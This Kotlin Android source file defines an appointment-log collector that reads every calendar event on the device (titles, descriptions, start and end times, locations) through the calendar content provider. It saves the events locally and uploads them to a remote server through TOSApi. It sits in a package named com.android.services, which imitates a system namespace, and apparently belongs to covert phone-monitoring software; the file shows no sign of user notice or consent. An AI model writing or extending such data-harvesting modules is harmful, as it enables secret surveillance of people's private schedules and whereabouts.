package com.android.services.logs.collectors

import android.content.Context
import android.net.Uri
import com.android.services.db.entities.AppointmentLog
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logException
import com.android.services.util.logVerbose
import java.util.*

class AppointmentCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    @Throws(Exception::class)
    override fun uploadLogs() {
        if (AppConstants.syncAppointments) {
            logVerbose("${AppConstants.APPOINTMENT_TYPE} Retrieving logs from local app")
            retrieveAndInsertAppointments(context)
            logVerbose("${AppConstants.APPOINTMENT_TYPE} Preparing for uploading")
            localDatabaseSource.getAppointments { appointments ->
                if (appointments.isNotEmpty()) {
                    logVerbose("${AppConstants.APPOINTMENT_TYPE} data = $appointments")
                    val endId = appointments[appointments.size - 1].uniqueId
                    val startId = appointments[0].uniqueId
                    val serverHelper = RemoteServerHelper(
                        context,
                        AppConstants.APPOINTMENT_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startId = startId,
                        endId = endId
                    )
                    serverHelper.upload(appointments)
                } else {
                    logVerbose("${AppConstants.APPOINTMENT_TYPE} No logs found")
                }
            }
        } else {
            logVerbose("${AppConstants.APPOINTMENT_TYPE} Sync is Off")
        }
    }

    private fun retrieveAndInsertAppointments(context: Context) {
        val appointmentList: MutableList<AppointmentLog> = ArrayList()
        try {
            val cursor = context.contentResolver.query(
                Uri.parse("content://com.android.calendar/events"), arrayOf(
                    "calendar_id", "title", "description", "dtstart", "dtend",
                    "eventLocation", "allDay", "_id"
                ), null, null,
                "_id DESC"
            )
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    val id = cursor.getInt(cursor.getColumnIndex("_id"))
                    if (localDatabaseSource.checkAppointmentNotAlreadyExists(id.toString())) {
                        try {
                            val name = AppUtils.formatDateTimezone(cursor.getString(3))
                            val appointmentLog = AppointmentLog()
                            appointmentLog.appointmentId = id.toString()
                            appointmentLog.appointmentName = name
                            appointmentLog.appointmentTitle = cursor.getString(1) ?: ""
                            appointmentLog.appointmentDescription = cursor.getString(2) ?: ""
                            appointmentLog.appointmentStartTime = if (cursor.getString(3) == null)
                                AppUtils.formatDate(System.currentTimeMillis().toString()) else
                                AppUtils.formatDate(cursor.getString(3))
                            appointmentLog.appointmentEndTime = if (cursor.getString(4) == null)
                                AppUtils.formatDate(System.currentTimeMillis().toString()) else
                                AppUtils.formatDate(cursor.getString(4))
                            appointmentLog.appointmentLocation = cursor.getString(5) ?: ""
                            appointmentLog.appointmentTimeZone =
                                name.substring(name.lastIndexOf(" ") + 1)
                            appointmentLog.allDayEvent = cursor.getString(6) ?: ""
                            appointmentLog.appointmentStatus = "1"
                            appointmentLog.appointmentReminder = ""
                            appointmentLog.sentStatus = 0
                            appointmentList.add(appointmentLog)
                        } catch (e: Exception) {
                            logException(e.message!!, AppConstants.APPOINTMENT_TYPE, e)
                        }
                    }
                }
                cursor.close()
                if (appointmentList.size > 0) {
                    localDatabaseSource.insertAppointment(appointmentList)
                }
            }
        } catch (e: Exception) {
            logException(e.message!!, AppConstants.APPOINTMENT_TYPE, e)
        }
    }
}